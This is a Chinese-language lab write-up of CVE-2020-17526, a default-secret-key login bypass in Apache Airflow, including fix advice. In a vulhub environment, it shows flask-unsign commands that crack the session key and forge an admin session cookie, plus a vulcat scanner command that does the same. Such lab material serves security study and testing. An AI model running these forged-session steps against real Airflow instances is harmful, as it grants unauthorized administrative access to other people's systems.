# 💛 Apache Airflow 默认密钥导致的权限绕过

### 1）漏洞信息

|漏洞名称	|受影响组件	|漏洞类型	|漏洞编号	|
|--	|--	|--	|--	|
|Apache Airflow未授权访问<br><br>Apache Airflow默认密钥漏洞	|[ApacheAirflow](https://airflow.apache.org/)	|未授权访问	|CVE-2020-17526	|

|漏洞简介	|
|--	|
|Apache Airflow是一款开源的，分布式任务调度框架。<br>默认情况下，Apache Airflow无需用户认证，但管理员也可以通过指定webserver.authenticate=True来开启认证。<br><br>在其1.10.13版本及以前，即使开启了认证，攻击者也可以通过一个默认密钥来绕过登录，伪造任意用户。	|

|参考链接	|
|--	|
|<ol><li><a href="https://vulhub.org/#/environments/airflow/CVE-2020-17526/">https://vulhub.org/#/environments/airflow/CVE-2020-17526/</a></ol>	|

|补丁及修复方案	|
|--	|
|<ol><li>修改[webserver] secret_key默认配置（修改默认密钥）</li><li>更新至最新版本：<a href="https://github.com/apache/airflow">https://github.com/apache/airflow</a></li></ol>	|

### 漏洞环境

使用[vulhub](https://github.com/vulhub/vulhub)搭建漏洞环境

```
git clone https://github.com/vulhub/vulhub
cd vulhub/airflow/CVE-2020-17526
docker-compose up -d
```

启动容器后，可以在8080端口看到Airflow登录页面

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/apache-airflow/cve-2020-17526/01.png" alt=""><figcaption></figcaption></figure>



### 漏洞复现-手工

抓取登录页面的数据包，查看Response
可以看到返回了Set-Cookie

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/apache-airflow/cve-2020-17526/02.png" alt=""><figcaption></figcaption></figure>


运行python的pip安装辅助工具flask-unsign

```shell
pip3 install flask-unsign[wordlist]

# 使用阿里云镜像，国内安装加速
pip3 install flask-unsign[wordlist] -i https://mirrors.aliyun.com/pypi/simple

# ！注意！我们需要的是命令行工具
pip3 install flask-unsign           # 这个是安装源代码
pip3 install flask-unsign[wordlist] # 这个是安装命令行工具
```

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/apache-airflow/cve-2020-17526/03.png" alt=""><figcaption></figcaption></figure>


安装完成之后，在命令行运行flask-unsign
如果看到工具提示信息，说明安装成功

```shell
flask-unsign
```

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/apache-airflow/cve-2020-17526/04.png" alt=""><figcaption></figcaption></figure>


然后运行以下命令，将Set-Cookie中的session参数传递给flask-unsign
flask-unsign会暴破session的加密密钥

```shell
flask-unsign -u -c <你的SESSION>

# 例如
flask-unsign -u -c eyJfZnJlc2giOmZhbHNlLCJjc3JmX3Rva2VuIjoiNzBhZmJhOGQ5ZmI2MDk5NGI2ZTk1YTkwZGUzYTBmZjE5ODA0YWY5YiJ9.ZAK0kQ.jSWDhcPF-n6f2V10PkCnNFUAekk
```

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/apache-airflow/cve-2020-17526/05.png" alt=""><figcaption></figcaption></figure>

如果暴破成功，会返回一个字符串
此处发现session的加密密钥为：temporary_key

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/apache-airflow/cve-2020-17526/06.png" alt=""><figcaption></figcaption></figure>

获得密钥之后，运行以下命令，伪造一个新的session，以便登录Airflow

```shell
flask-unsign -s --secret <你的密钥> -c "{'user_id': '1', '_fresh': False, '_permanent': True}"

# 例如
flask-unsign -s --secret temporary_key -c "{'user_id': '1', '_fresh': False, '_permanent': True}"
```

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/apache-airflow/cve-2020-17526/07.png" alt=""><figcaption></figcaption></figure>

获得伪造的session之后，将其添加到Cookie当中

```
Cookie: session=你伪造的SESSION
```

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/apache-airflow/cve-2020-17526/08.png" alt=""><figcaption></figcaption></figure>

然后刷新页面，成功进入后台
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/apache-airflow/cve-2020-17526/09.png" alt=""><figcaption></figcaption></figure>



### 漏洞复现-vulcat

```shell
python3 vulcat.py -u <URL> -a airflow

# 注意, vulcat-v2.0.0版本及以上, 应使用以下命令
python3 vulcat.py -u <URL> -v cve-2020-17526
```

如图，vulcat返回了默认密钥 以及 伪造的session

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/apache-airflow/cve-2020-17526/10.png" alt=""><figcaption></figcaption></figure>

将伪造的session添加到Cookie

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/apache-airflow/cve-2020-17526/11.png" alt=""><figcaption></figcaption></figure>

刷新页面，成功进入后台

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/apache-airflow/cve-2020-17526/12.png" alt=""><figcaption></figcaption></figure>


